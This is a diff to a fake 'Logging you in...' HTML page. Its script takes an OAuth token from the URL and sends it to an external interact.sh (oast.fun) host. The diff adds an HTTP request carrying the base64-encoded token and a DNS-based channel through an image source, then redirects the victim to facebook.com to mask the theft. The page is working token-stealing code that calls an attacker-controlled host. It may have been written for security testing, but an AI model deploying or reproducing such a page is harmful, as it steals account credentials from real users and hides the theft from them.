@@ -4,14 +4,16 @@
 <body>
   <h2>Logging you in...</h2>
   <script>
-    // Simulate stealing OAuth tokens (for demo purposes)
     const params = new URLSearchParams(window.location.search);
     const token = params.get("token") || "no_token_found";
 
-    // Exfiltrate (you'd log this server-side)
-    fetch("https://ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun/log.php?token=" + encodeURIComponent(token));
+    // HTTP-based exfil to interact.sh
+    fetch("https://ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun/" + btoa(token));
 
-    // Optional redirect to legit site after
+    // Optional: DNS-based ping (if interact.sh listens for DNS queries)
+    new Image().src = "http://" + btoa(token) + ".ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun";
+
+    // Redirect to Facebook or any legit page after 2s
     setTimeout(() => {
       window.location.href = "https://facebook.com";
     }, 2000);
